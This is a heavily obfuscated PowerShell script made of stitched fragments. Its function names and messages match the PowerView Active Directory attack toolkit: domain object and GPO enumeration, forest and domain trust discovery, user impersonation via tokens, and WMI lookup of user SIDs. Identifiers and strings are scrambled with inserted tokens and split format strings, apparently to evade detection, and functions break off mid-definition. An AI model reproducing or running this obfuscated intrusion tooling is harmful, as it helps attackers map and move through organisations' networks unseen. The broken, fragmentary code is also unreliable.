        YoV{SEaIJKRIJKcHerAIJKRIJKGumeIJKNtS} = @{
            (Z3b{2}{1}{0}Z3b','{3}{4}Z3b -fS5zctionS5z,S5zES5z,S5z.S5z,S5zomAttribuS5z,S5zteBuilderS5z,S5zmit.CustS5z,S5zRefleS5z)(YoV{CoIJKNSTruCTIJKorIJKinfO},
                    YoV{UnManagIJKedTIJKyIJKpE}, YoV{SIzecIJKOIJKNST}, @(YoV{SIJKiZe}))
            }
            else
            {
                YoV{AtTRIJKIIJKBBuilIJKdEr} = &(Z3b{1}{2}{0}Z3b -f S5zectS5z,S5zNS5z,S5zew-ObjS5z) (Z3b{6}{2}{4}{0}{5}{1}{7}{3}Z3b -fS5ztion.Emit.CS5z,S5zstoS5z,S5zeflS5z,S5zrS5z,S5zecS5z,S5zuS5z,S5zRS5z,S5zmAttributeBuildeS5z)(YoV{coIJKNSIJKTRuctoIJKRiIJKNfo}, [Object[]] @(YoV{UnMaIJKNAgEdIJKTYPe}))
            }

            YoV{NEIJKwFIIJKeld}.(Z3b{0}{2}{1}{5}{3}{4}Z3b -f S5zSS5z,S5ztCustomAS5z,S5zeS5z,S5ztribS5z,S5zuteS5z,S5ztS5z).Invoke(YoV{AIJKTtIJKRIJKibBuildeR})
        }

        if (YoV{eIJKXplIcItIJKLIJKAyOUt}) { YoV{nIJKewIJKFIJKIELD}.(Z3b{0}{1}Z3b-fS5zSetOS5z,S5zffsetS5z).Invoke(YoV{OFfIJKSIJKET}) }
    }

    
    
    YoV{SIJKizIJKEmethIJKOD} = YoV{stRUCtBIJKUiIJKlIJKDER}.(Z3b{1}{0}{2}{3}Z3b-fS5zeS5z,S5zDefinS5z,S5zMeS5z,S5zthodS5z).Invoke((Z3b{0}{1}Z3b -fS5zGetSS5z,S5zizeS5z),
        (Z3b{3}{1}{2}{4}{0}Z3b-fS5zcS5z,S5zlic,S5z,S5z SS5z,S5zPubS5z,S5ztatiS5z),
        [Int],
        [Type[]] @())
    YoV{IlIJKgenERIJKAIJKTOr} = YoV{sIJKizEMetIJKhOD}.(Z3b{0}{3}{2}{1}{4}Z3b -f S5zGeS5z,S5zoS5z,S5zILGeneratS5z,S5ztS5z,S5zrS5z).Invoke()
    
    YoV{iLgIJKENeIJKRaIJKTOR}.(Z3b{1}{0}Z3b -fS5zmitS5z,S5zES5z).Invoke( ( &(Z3b{1}{3}{2}{0}Z3b-f S5zES5z,S5zGet-VaS5z,S5zaBlS5z,S5zrIS5z) (Z3baUZ3b+Z3bfZ3b) -VALu)::Z3blDTIJKOKIJKENZ3b, YoV{sIJKTrIJKUCtbuIJKiLDIJKER})
    YoV{iIJKlGIJKeNEIJKRaToR}.(Z3b{0}{1}Z3b -fS5zEmiS5z,S5ztS5z).Invoke( (  &(Z3b{0}{2}{1}Z3b -fS5zget-VArIS5z,S5zBleS5z,S5zAS5z)  auF -Va)::Z3bcIJKALlZ3b,
         YoV{VIJKxPJ}.(Z3b{2}{1}{0}Z3b-f S5zdS5z,S5ztMethoS5z,S5zGeS5z).Invoke((Z3b{0}{1}{3}{2}Z3b-f S5zGS5z,S5zetS5z,S5zmHandleS5z,S5zTypeFroS5z)))
    YoV{iIJKlGEIJKNEratIJKoR}.(Z3b{0}{1}Z3b-fS5zES5z,S5zmitS5z).Invoke(  (&(Z3b{0}{1}Z3b -f S5zgS5z,S5zCIS5z)  (S5zVS5z+S5zaS5z+S5zRIaBlE:S5z+S5zAufS5z) ).Z3bVAlIJKUeZ3b::Z3bcIJKAllZ3b,
         (  &(Z3b{2}{1}{0}Z3b-f S5zmS5z,S5zET-ItES5z,S5zGS5z)  (Z3bVaRZ3b+Z3bIZ3b+Z3baBLZ3b+Z3bE:NPZ3b+Z3b6YrZ3b)).Z3bVaIJKLUEZ3b.(Z3b{1}{0}Z3b -f S5zodS5z,S5zGetMethS5z).Invoke((Z3b{2}{0}{1}Z3b -f S5zzS5z,S5zeOfS5z,S5zSiS5z), [Type[]] @([Type])))
    YoV{IlIJKgIJKenEIJKRator}.(Z3b{1}{0}Z3b-fS5zitS5z,S5zEmS5z).Invoke(  YoV{AIJKUF}::Z3bRIJKetZ3b)

    
    
    YoV{IIJKmIJKPLIcITcOnveRIJKTIJKer} = YoV{stIJKRuCtIJKBuIJKIlIJKdeR}.(Z3b{2}{1}{0}{3}Z3b -fS5zMethS5z,S5zineS5z,S5zDefS5z,S5zodS5z).Invoke((Z3b{1}{2}{0}Z3b-fS5zitS5z,S5zop_ImpS5z,S5zlicS5z),
        (Z3b{2}{4}{3}{5}{1}{8}{6}{7}{0}{11}{9}{10}Z3b-fS5zySS5z,S5z, StatS5z,S5zPrivaS5z,S5zcS5z,S5zteSS5z,S5zope, PublicS5z,S5z, HiS5z,S5zdeBS5z,S5zicS5z,S5zg,S5z,S5z SpecialNameS5z,S5ziS5z),
        YoV{sIJKTIJKRIJKUCTbuiLdIJKER},
        [Type[]] @([IntPtr]))
    YoV{ilGeNEIJKRaIJKTor2} = YoV{iMIJKpIJKLIJKiCitcoNVEIJKRTer}.(Z3b{4}{3}{0}{1}{2}Z3b-fS5zLGenS5z,S5zeraS5z,S5ztorS5z,S5zetIS5z,S5zGS5z).Invoke()
    YoV{ilIJKgIJKenERatOr2}.(Z3b{1}{0}Z3b-f S5zitS5z,S5zEmS5z).Invoke(  YoV{AIJKUF}::Z3bNIJKOPZ3b)
    YoV{iLgenIJKeRIJKAtoIJKR2}.(Z3b{0}{1}Z3b -fS5zEmiS5z,S5ztS5z).Invoke( YoV{AIJKUF}::Z3bLIJKDArg_0Z3b)
    YoV{IlIJKGENIJKerIJKATIJKOR2}.(Z3b{0}{1}Z3b -fS5zEmS5z,S5zitS5z).Invoke(  (&(Z3b{0}{2}{1}Z3b-f S5zvS5z,S5zIAbleS5z,S5zArS5z)  (S5zaS5z+S5zUFS5z)  -VaL  )::Z3bLdIJKToKIJKEnZ3b, YoV{STIJKRUIJKctbIJKUIIJKLder})
    YoV{IlGIJKeneRatIJKOr2}.(Z3b{0}{1}Z3b -f S5zES5z,S5zmitS5z).Invoke( YoV{AIJKUf}::Z3bCaIJKLlZ3b,
         ( &(S5zgiS5z)  vaRiablE:vxpJ).Z3bVIJKAlueZ3b.(Z3b{2}{0}{1}Z3b -f S5ztMethS5z,S5zodS5z,S5zGeS5z).Invoke((Z3b{0}{3}{5}{1}{4}{2}Z3b -fS5zGetTypeS5z,S5znS5z,S5zleS5z,S5zFS5z,S5zdS5z,S5zromHaS5z)))
    YoV{IIJKlgEIJKNerIJKATOIJKR2}.(Z3b{0}{1}Z3b -fS5zEmS5z,S5zitS5z).Invoke( YoV{aIJKUF}::Z3bcaIJKLLZ3b,
          (  &(Z3b{0}{1}Z3b-fS5zvS5z,S5zARiABLeS5z)  NP6Yr).Z3bVIJKALuEZ3b.(Z3b{0}{2}{1}Z3b-fS5zGetMS5z,S5zodS5z,S5zethS5z).Invoke((Z3b{1}{0}{2}Z3b -f S5zrToStrS5z,S5zPtS5z,S5zuctureS5z), [Type[]] @([IntPtr], [Type])))
    YoV{ilGenIJKeRaToIJKR2}.(Z3b{1}{0}Z3b -fS5zitS5z,S5zEmS5z).Invoke( (&(Z3b{0}{1}{2}Z3b-f S5zgeT-S5z,S5zITeS5z,S5zmS5z)  VaRiabLe:aUf ).Z3bvALIJKUeZ3b::Z3bUNBIJKox_AIJKNYZ3b, YoV{StRIJKUCIJKTIJKBUilDer})
    YoV{IlGIJKeNEIJKRaTOR2}.(Z3b{1}{0}Z3b -fS5ztS5z,S5zEmiS5z).Invoke(  YoV{AIJKUF}::Z3bRIJKeTZ3b)

    YoV{StIJKRIJKUctbIJKUIJKILdER}.(Z3b{0}{2}{1}Z3b-f S5zCS5z,S5zeTypeS5z,S5zreatS5z).Invoke()
}








Function NEw-DynIJKAmiCpIJKAIJKRIJKAMEtEr {


    [CmdletBinding(deFAuLTparAmEtersETnamE = {Z3b{1}{3}{2}{0}Z3b -fS5zeterS5z,S5zDynamicPaS5z,S5zamS5z,S5zrS5z})]
    Param (
        [Parameter(MaNdAtoRY = YoV{TIJKRuE}, VAlUEFroMpIPeLInE = YoV{tRIJKUe}, valueFrOMPIpelIneBypRoPERtyname = YoV{TIJKRue}, ParaMeteRsEtNAme = Z3bdIJKynamiCIJKparIJKAIJKMEtIJKERZ3b)]
        [ValidateNotNullOrEmpty()]
        [string]YoV{nIJKAmE},

        [Parameter(VaLuEFrOmPiPeLiNEbYPROpErtYnAme = YoV{TrIJKUe}, PArAMETERSetnaMe = Z3bDyNaMIIJKcPaIJKRAmIJKeTIJKerZ3b)]
        [System.Type]YoV{TyIJKpe} = [int],

        [Parameter(vALUEfRompiPeLInEBYP','   try { YoV{ReIJKSuIJKlTs}.(Z3b{1}{2}{0}Z3b-f S5zseS5z,S5zdisS5z,S5zpoS5z).Invoke() }
                catch {
                    &(Z3b{0}{1}{3}{2}Z3b -fS5zWriteS5z,S5z-S5z,S5zrboseS5z,S5zVeS5z) (S5z[S5z+S5zGet-DS5z+S5zomainComputeS5z+S5zr]S5z+S5z S5z+S5zES5z+S5zrroS5z+S5zr S5z+S5zdS5z+S5zispoS5z+S5zsing S5z+S5zofS5z+S5z S5z+S5zthS5z+S5ze S5z+S5zReS5z+S5zsults S5z+S5zoS5z+S5zbjS5z+S5zect: S5z+Z3bYoV_Z3b)
                }
            }
            YoV{cIJKOMpSeArCIJKher}.(Z3b{2}{0}{1}Z3b -f S5zispS5z,S5zoseS5z,S5zdS5z).Invoke()
        }
    }
}


function gIJKEt-dOMIJKAINObjEIJKct {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{6}{8}{7}{2}{3}{4}{5}{10}{1}{0}{9}Z3b -f S5zntS5z,S5zgnmeS5z,S5zlaredVarS5z,S5zsS5z,S5zMoS5z,S5zreThaS5z,S5zPSUseS5z,S5zecS5z,S5zDS5z,S5zsS5z,S5znAssiS5z}, S5zS5z)]
    [OutputType({Z3b{2}{0}{3}{4}{1}Z3b-f S5zerS5z,S5zctS5z,S5zPowS5z,S5zViS5z,S5zew.ADObjeS5z})]
    [OutputType({Z3b{2}{0}{5}{3}{1}{4}Z3b -fS5zerView.ADS5z,S5zectS5z,S5zPowS5z,S5zjS5z,S5z.RawS5z,S5zObS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITiON = 0, vaLUefRomPipELInE = YoV{TIJKRUe}, vaLuEfROmpIPElineBYpropertyName = YoV{TIJKRUE})]
        [Alias({Z3b{4}{0}{2}{3}{1}Z3b-f S5zistinguishedS5z,S5zeS5z,S5zNS5z,S5zamS5z,S5zDS5z}, {Z3b{4}{3}{1}{0}{2}Z3b -f S5zunS5z,S5zccoS5z,S5ztNameS5z,S5zAS5z,S5zSamS5z}, {Z3b{1}{0}Z3b -f S5zmeS5z,S5zNaS5z}, {Z3b{0}{3}{4}{2}{1}Z3b-f S5zMeS5z,S5zedNameS5z,S5zishS5z,S5zmberDS5z,S5zistinguS5z}, {Z3b{2}{1}{0}Z3b -f S5zrNameS5z,S5zembeS5z,S5zMS5z})]
        [String[]]
        YoV{idIJKeIJKNTITy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKoMAin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -fS5zrS5z,S5zFilteS5z})]
        [String]
        YoV{LdapFIJKIIJKltER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{prOIJKpIJKERtIJKIES},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b -f S5zADS5z,S5zSPathS5z})]
        [String]
        YoV{sIJKEaIJKRChbaIJKsE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{1}{2}{3}{0}Z3b-f S5zllerS5z,S5zomaiS5z,S5znS5z,S5zControS5z,S5zDS5z})]
        [String]
        YoV{SIJKERIJKVeR},

        [ValidateSet({Z3b{1}{0}Z3b-f S5zaseS5z,S5zBS5z}, {Z3b{0}{1}{2}Z3b -f S5zOnS5z,S5zeS5z,S5zLevelS5z}, {Z3b{1}{0}Z3b-fS5zbtreeS5z,S5zSuS5z})]
        [String]
        YoV{sEAIJKRIJKCHsIJKcOPe} = (Z3b{0}{1}Z3b-fS5zSubtS5z,S5zreeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{reSuLTIJKPIJKAgEsiIJKZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SeRVeRTIJKiMelIJKiMIJKiT},

        [ValidateSet({Z3b{0}{1}Z3b -fS5zDaS5z,S5zclS5z}, {Z3b{1}{0}Z3b-f S5zupS5z,S5zGroS5z}, {Z3b{0}{1}Z3b -f S5zNoS5z,S5zneS5z}, {Z3b{1}{0}Z3b -f S5zrS5z,S5zOwneS5z}, {Z3b{1}{0}Z3b -fS5zaclS5z,S5zSS5z})]
        [String]
        YoV{SeCIJKUrIIJKTYIJKMaIJKSKs},

        [Switch]
        YoV{TIJKOMIJKBSIJKTONE},

        [Alias({Z3b{1}{0}Z3b -fS5zeS5z,S5zReturnOnS5z})]
        [Switch]
        YoV{FIJKIIJKNdoNe},

        [Management.Automation.PSCredential]
        [Mana','l]
        [Management.Automation.CredentialAttribute()]
        YoV{CrEDIJKENtIJKiIJKAL} =   (&(Z3b{0}{2}{1}Z3b-f S5zgEt-vaRiAS5z,S5zES5z,S5zBLS5z)  (S5zJfS5z+S5ziS5z) -VAluEOnL  )::Z3bEIJKMptyZ3b
    )

    BEGIN {
        if (','1}Z3b -f S5zEnteS5z,S5zsS5z,S5zrprise S5z,S5zAdmiS5z,S5znS5z))

    YoV{FIJKoReST} =   YoV{JIJK1F}::(Z3b{4}{2}{3}{0}{1}Z3b-f S5ztForesS5z,S5ztS5z,S5zeS5z,S5ztCurrenS5z,S5zGS5z).Invoke()
    YoV{domAIJKiIJKNliST} = @(YoV{FIJKorIJKEsT}.Z3bDIJKOmaIIJKNsZ3b)
    YoV{DOMIJKAINs} = YoV{dOIJKMaIJKinIJKliSt} JGO &(Z3b{0}{1}Z3b-fS5zfS5z,S5zoreachS5z) { YoV{_}.(Z3b{4}{5}{2}{3}{0}{1}Z3b-f S5zyS5z,S5zEntryS5z,S5zecS5z,S5ztorS5z,S5zGS5z,S5zetDirS5z).Invoke() }
    foreach (YoV{dIJKOIJKMaIN} in YoV{DomIJKAiIJKNS}) {
        YoV{fIJKiIJKlter} = Z3b(&(objectCategory=groupPolicyContainer)(displayname=YoVGPOName))Z3b
        YoV{seArcIJKhIJKEr} = &(Z3b{0}{1}{2}Z3b-f S5zNew-S5z,S5zOS5z,S5zbjectS5z) (Z3b{7}{0}{8}{5}{3}{4}{9}{10}{2}{6}{1}Z3b-fS5zirecS5z,S5zcherS5z,S5zSS5z,S5zrS5z,S5zvicS5z','}{1}Z3b -fS5zSeS5z,S5ztS5z,S5zmeS5z,S5zrverTiS5z,S5zLimiS5z)]) { Y','S5zmaiS5z,S5z-DoS5z) @SearcherArguments
                        if (-not YoV{coIJKmpseIJKAIJKRchEr}) {
                            &(Z3b{2}{0}{1}Z3b-fS5znS5z,S5zgS5z,S5zWrite-WarniS5z) (S5z[GeS5z+S5ztS5z+S5z-DS5z+S5zomainS5z+S5zCS5z+S5zomputeS5z+S5zr] S5z+S5zUnS5z+S5zablS5z+S5ze S5z+S5ztS5z+S5zo S5z+S5zreS5z+S5ztriS5z+S5zeve S5z+S5zdomaS5z+S5ziS5z+S5zn S5z+S5zsearcheS5z+S5zr S5z+S5zforS5z+S5z S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                        }
                    }
                }
                elseif (YoV{IdeNIJKTIJKitYIIJKNsTANIJKcE}.(Z3b{0}{2}{1}Z3b-f S5zCS5z,S5ztainsS5z,S5zonS5z).Invoke(S5z.S5z)) {
                    YoV{IDIJKenIJKTiIJKTIJKYfiLTer} += Z3b(JGO(name=YoVIdentityInstance)(dnshostname=YoVIdentityInstance))Z','S5zrEFlectiS5z,S5z.EMIT.PS5z,S5zaCkiS5z,S5zNGSizS5z,S5zonS5z)) ;  &(Z3b{0}{2}{1}Z3b-f S5zseS5z,S5zeMS5z,S5zt-ItS5z)  vARiAblE:hpMyz2 ([Type](Z3b{7}{6}{4}{2}{5}{3}{1}{0}Z3b-fS5zbuTEsS5z,S5zttrIS5z,S5zctiONS5z,S5zAS5z,S5zeS5z,S5z.TyPES5z,S5zEFLS5z,S5zRS5z) ) ;  &(Z3b{1}{2}{0}Z3b-fS5zMS5z,S5zSeT-iTS5z,S5zES5z) (S5zVARIABLS5z+S5zE:SS5z+S5ztCS5z+S5z3S5z)  ( [tYPe](Z3b{0}{2}{5}{7}{4}{1}{6}{3}Z3b -FS5zrUS5z,S5zhS5z,S5zNtiME.IntERoPS5z,S5zSaTTrIbUTES5z,S5zICEs.marSS5z,S5zsS5z,S5zAlAS5z,S5zervS5z)  ) ;  YoV{V','    }
        }
    }
}


function iNvokIJKe-USerIJKIMpERSOIJKNAIJKTIJKIoN {


    [OutputType([IntPtr])]
    [CmdletBinding(dEFaUltParameterseTnAMe = {Z3b{1}{0}{2}Z3b -fS5ztiaS5z,S5zCredenS5z,S5zlS5z})]
    Param(
        [Parameter(MaNDAtOry = YoV{TRIJKUe}, ParAmEteRsEtname = Z3bCrIJKEIJKDeNtialZ3b)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKReDeIJKNtIAL},

        [Parameter(maNDAToRy = YoV{trIJKUe}, pARamEtERSetNAmE = Z3btoIJKKENhIJKAIJKNdleZ3b)]
        [ValidateNotNull()]
        [IntPtr]
        YoV{ToIJKKeNIJKHaIJKNdLe},

        [Switch]
        YoV{quIJKiet}
    )

  ','}
                        YoV{GIJKpO}.Z3bPsoBIJKJEctZ3b.Z3btIJKYPenaIJKMesZ3b.(Z3b{0}{2}{1}Z3b-f S5zIS5z,S5zertS5z,S5znsS5z).Invoke(0, (Z3b{0}{3}{2}{1}Z3b-fS5zPS5z,S5zPOS5z,S5zGS5z,S5zowerView.S5z))
                    }
                    YoV{GIJKpo}
                }
                if (YoV{REsuIJKLts}) {
                    try { YoV{RIJKeSIJKULts}.(Z3b{1}{2}{0}Z3b -f S5zoseS5z,S5zdiS5z,S5zspS5z).Invoke() }
                    catch {
                        &(Z3b{3}{4}{1}{2}{0}Z3b-f S5zeS5z,S5zVS5z,S5zerbosS5z,S5zWritS5z,S5ze-S5z) (S5z[Get-S5z+S5zDoS5z+S5zmainGPO] S5z+S5zErroS5z+S5zr S5z+S5zdisposiS5z+S5znS5z+S5zg S5z+S5zoS5z+S5zf S5z+S5zthS5z+S5ze S5z+S5zResuS5z+S5zlS5z+S5zts S5z+S5zobjecS5z+S5zt: S5z+Z3bYoV_Z3b)
                    }
                }
                YoV{gIJKpoSearIJKchIJKer}.(Z3b{0}{1}Z3b -f S5zdisposS5z,S5zeS5z).Invoke()
            }
        }
    }
}


function GET-IJKDoIJKMaiIJKNgPoIJKlOCAlGIJKRoIJKUP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{1}{2}{4}Z3b -fS5zPSShS5z,S5zuS5z,S5zldProS5z,S5zoS5z,S5zcessS5z}, S5zS5z)]
    [OutputType({Z3b{1}{3}{2}{0}Z3b -fS5zew.GPOGroupS5z,S5zPS5z,S5zrViS5z,S5zoweS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITIOn = 0, ValueFROMPipeLInE = YoV{TIJKRUE}, vALuefrOmpiPELineBypROpERtyNAMe = YoV{tIJKRUE})]
        [Alias({Z3b{0}{3}{2}{1}Z3b -fS5zDS5z,S5zdNameS5z,S5zguisheS5z,S5zistinS5z}, {Z3b{0}{1}{3}{4}{2}Z3b-fS5zSS5z,S5zamAcS5z,S5zameS5z,S5zcoS5z,S5zuntNS5z}, {Z3b{0}{1}Z3b-f S5zNaS5','{3}{0}{1}{2}Z3b-f S5zte-VeS5z,S5zrbS5z,S5zoseS5z,S5zWriS5z) Z3b[Get-DomainTrust] Error: YoV(([ComponentModel.Win32Exception] YoVResult).Message) Z3b
            }
        }
        else {
            
            YoV{FouNIJKDDoIJKmAIJKin} = &(Z3b{0}{2}{1}Z3b -fS5zGet-S5z,S5zmainS5z,S5zDoS5z) @NetSearcherArguments
            if (YoV{fOIJKUndDoIJKMain}) {
                YoV{fIJKoUnIJKDdomIJKAiN}.(Z3b{2}{6}{1}{5}{4}{3}{0}Z3b-f S5zsS5z,S5zlTruS5z,S5zGetS5z,S5zpS5z,S5znshiS5z,S5zstRelatioS5z,S5zAlS5z).Invoke() JGO &(Z3b{2}{0}{1}Z3b -f S5z-ObjS5z,S5zectS5z,S5zForEachS5z) {
                    YoV{_}.Z3bPSOIJKBjEIJKCtZ3b.Z3bTyIJKpENameSZ3b.(Z3b{1}{0}Z3b -fS5znsertS5z,S5zIS5z).Invoke(0, (Z3b{3}{7}{2}{1}{6}{5}{0}{4}Z3b-f S5zinTrS5z,S5zw.S5z,S5zeS5z,S5zPowerS5z,S5zust.NETS5z,S5zaS5z,S5zDomS5z,S5zViS5z))
                    YoV{_}
                }
            }
        }
    }
}


function GIJKeTIJK-fOrESTIJKTRuIJKst {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{2}{4}{1}Z3b-fS5zPSShoulS5z,S5zessS5z,S5zrS5z,S5zdPS5z,S5zocS5z}, S5zS5z)]
    [OutputType({Z3b{1}{0}{4}{3}{5}{6}{2}Z3b-fS5zerVS5z,S5zPowS5z,S5zTS5z,S5z.ForS5z,S5ziewS5z,S5zestTrust.NS5z,S5zES5z})]
    [CmdletBinding()]
    Param(
        [Par','
      ','mdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DOIJKMIJKAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}{4}{3}Z3b -fS5zDomaiS5z,S5zlS5z,S5znControS5z,S5zerS5z,S5zlS5z})]
        [String]
        YoV{SEIJKRvER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKRIJKEdENTIIJKAL} =  YoV{jIJKFI}::Z3beMpIJKTyZ3b
    )

    YoV{searchIJKEraRGIJKUIJKMenTS} = @{
        (Z3b{2}{1}{0}Z3b -fS5zPFilterS5z,S5zDAS5z,S5zLS5z) = ((Z3b{7}{9}{5}{4}{1}{8}{10}{0}{2}{3}{6}Z3b-fS5z40S5z,S5zntControS5z,S5z.113556.1.4.8S5z,S5z03:=81S5z,S5zouS5z,S5zccS5z,S5z92)S5z,S5z(S5z,S5zl:1S5z,S5zuserAS5z,S5z.2.8S5z))
    }
    if (YoV{psboUIJKND','SHaRE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{2}{0}Z3b-fS5zsS5z,S5zPSShouldPS5z,S5zrocesS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{5}{2}{4}{0}{1}{3}Z3b -fS5zssS5z,S5zignmS5z,S5zThS5z,S5zentsS5z,S5zanAS5z,S5zPSUseDeclaredVarsMoreS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{4}{2}{1}{0}Z3b-f S5zrbsS5z,S5zdVeS5z,S5zpproveS5z,S5zPSUseS5z,S5zAS5z}, S5zS5z)]
    [OutputType({Z3b{10}{5}{8}{2}{3}{9}{0}{6}{1}{4}{11}{7}Z3b-f S5zagemeS5z,S5zt.AuS5z,S5z.S5z,S5zMaS5z,S5ztomatioS5z,S5zstS5z,S5znS5z,S5zomObjectS5z,S5zemS5z,S5znS5z,S5zSyS5z,S5zn.PSCustS5z})]
    [CmdletBinding()]
    Param(
        [Parameter( VaLUEFrOMPIpELInE = YoV{tIJKRUe}, vaLUEFroMPiPelInebypROPeRTYNAMe = ','e({Z3b{2}{4}{6}{1}{3}{5}{7}{0}Z3b-f S5zIS5z,S5zinTrS5z,S5zPowerVS5z,S5zuS5z,S5ziew.DS5z,S5zst.AS5z,S5zomaS5z,S5zPS5z})]
    [CmdletBinding(deFAultPaRamEtERSETnAmE = {Z3b{0}{1}Z3b -fS5zLDAS5z,S5zPS5z})]
    Param(
        [Parameter(paRaMETErSETNamE = S5zAPIS5z)]
        [Switch]
        YoV{AIJKPi},

        [Parameter(pAramETERsEtNAMe = S5zNETS5z)]
        [Switch]
        YoV{NIJKeT},

        [Parameter(paraMeTersETnamE = Z3bLdIJKApZ3b)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -fS5zlterS5z,S5zFiS5z})]
        [String]
        YoV{lDAPFIJKIIJKltEr},

        [Parameter(PARameteRsEtNAMe = Z3bLDIJKApZ3b)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{pIJKRIJKoPeRtIJKies},

        [Parameter(parAmETeRsEtNAME = Z3blIJKDApZ3b)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -fS5zathS5z,S5zADSPS5z})]
        [String]
 ','S5z,S5zEMBS5z,S5zERS_INS5z,S5zMS5z,S5zROUPS5z) @{
    (Z3b{2}{3}{1}{0}Z3b -fS5zsidS5z,S5zi2_S5z,S5zlS5z,S5zgrmS5z) = &(Z3b{1}{0}Z3b -f S5zeldS5z,S5zfiS5z) 0 (Z3b{1}{0}Z3b -fS5ztrS5z,S5zIntPS5z)
    (Z3b{0}{3}{2}{1}Z3b -f S5zlgrmi2_siS5z,S5zeS5z,S5zsagS5z,S5zduS5z) = &(Z3b{1}{0}Z3b -fS5zdS5z,S5zfielS5z) 1 YoV{siIJKd_NIJKAIJKMeIJK_USe}
    (Z3b{3}{2}{1}{4}{0}Z3b-fS5zmeS5z,S5zmainaS5z,S5zi2_doS5z,S5zlgrmS5z,S5zndnaS5z) = &(Z3b{0}{1}Z3b -fS5zfielS5z,S5zdS5z) 2 (Z3b{1}{0}Z3b -f S5ztringS5z,S5zSS5z) -MarshalAs @((Z3b{0}{1}Z3b -fS5zLPWSS5z,S5ztrS5z))
}


YoV{DSIJKDOIJKmAiNflAg} = &(Z3b{0}{1}{2}Z3b-f S5zpseS5z,S5znS5z,S5zumS5z) YoV{MIJKOD} (Z3b{3}{0}{1}{2}Z3b -fS5zsDomainS5z,S5z.FS5z,S5zlagsS5z,S5zDS5z) (Z3b{0}{1}Z3b-f S5zUIS5z,S5znt32S5z) @{
    (Z3b{1}{0}{2}Z3b-fS5zRESS5z,S5zIN_FOS5z,S5zTS5z)       = 1
    (Z3b{0}{2}{1}Z3b-f S5zDIRECT_OS5z,S5zNDS5z,S5zUTBOUS5z) = 2
    (Z3b{2}{0}{1}Z3b -f S5zREES5z,S5z_ROOTS5z,S5zTS5z)       = 4
    (Z3b{1}{0}Z3b -f S5zIMARYS5z,S5zPRS5z)         = 8
    (Z3b{1}{2}{3}{0}Z3b -f S5zES5z,S5zNATIS5z,S5zVE_S5z,S5zMODS5z)     = 16
    (Z3b{3}{0}{1}{2}Z3b-fS5zT_S5z,S5zINBOUS5z,S5zNDS5z,S5zDIRECS5z)  = 32
} -Bitfield
YoV{DIJKsDOIJKMaINtRuSTtyIJKpE} = &(Z3b{0}{1}Z3b -f S5zpsenuS5z,S5zmS5z) YoV{MIJKod} (Z3b{1}{3}{4}{0}{2}Z3b-fS5z.TrusS5z,S5zDsDS5z,S5ztTypeS5z,S5zomaiS5z,S5znS5z) (Z3b{1}{2}{0}Z3b -fS5z32S5z,S5zUIS5z,S5zntS5z) @{
    (Z3b{0}{1}Z3b-f S5zDOWNLEVS5z,S5zELS5z)   = 1
    (Z3b{0}{1}Z3b -fS5zUS5z,S5zPLEVELS5z)     = 2
   ',',S5zSS5z)
                (Z3b{0}{1}{2}Z3b -f S5zNS5z,S5zamespS5z,S5zaceS5z) = (((Z3b{0}{4}{2}{1}{3}Z3b-fS5zrooS5z,S5zdS5z,S5zHS5z,S5zefaultS5z,S5ztR7S5z)).(Z3b{1}{0}Z3b -f S5zepLACES5z,S5zrS5z).Invoke(S5zR7HS5z,S5z5rjS5z))
                (Z3b{3}{0}{2}{1}Z3b-f S5zrS5z,S5zameS5z,S5znS5z,S5zComputeS5z) = YoV{CoMPIJKUIJKTEr}
                (Z3b{2}{1}{0}Z3b-fS5znS5z,S5zrActioS5z,S5zErroS5z) = (Z3b{0}{1}Z3b -f S5zStoS5z,S5zpS5z)
            }
            if (YoV{psIJKBoUndpaRIJKAmEIJKTeRs}[(Z3b{2}{0}{1}Z3b-f S5zdeS5z,S5zntialS5z,S5zCreS5z)]) { YoV{WmiaIJKRIJKGIJKUIJKMeNTS}[(Z3b{1}{2}{0}Z3b -fS5zalS5z,S5zCredenS5z,S5ztiS5z)] = YoV{cReIJKdIJKeNTIIJKAL} }

            try {
                YoV{RIJKEg} = &(Z3b{0}{3}{2}{1}Z3b -fS5zGet-WS5z,S5zjectS5z,S5zObS5z,S5zmiS5z) @WmiArguments

                
                YoV{USIJKERsiIJKDS} = (YoV{RIJKeG}.(Z3b{1}{0}Z3b-fS5zyS5z,S5zEnumKeS5z).Invoke(YoV{HIJKkU}, S5zS5z)).Z3bSnAmIJKesZ3b JGO &(Z3b{3}{0}{1}{2}Z3b -f S5zre-OS5z,S5zbS5z,S5zjectS5z,S5zWheS5z) { YoV{_} -match ((S5zS-1S5z+S5z-5-2S5z+S5z1-S5z+S5z[S5z+S5z0-S5z+S5z9S5z+S5z]+-[0-9]+-[0S5z+S5z-9]+-[S5z+S5z0-9]+0GoS5z).Z3brEplIJKACEZ','ropeRTYname = YoV{TIJKRuE}, paRaMeTerSETnAmE = Z3bDynIJKAMICIJKPIJKAIJKRamEtErZ3b)]
        [string[]]YoV{AIJKLIJKiAs},

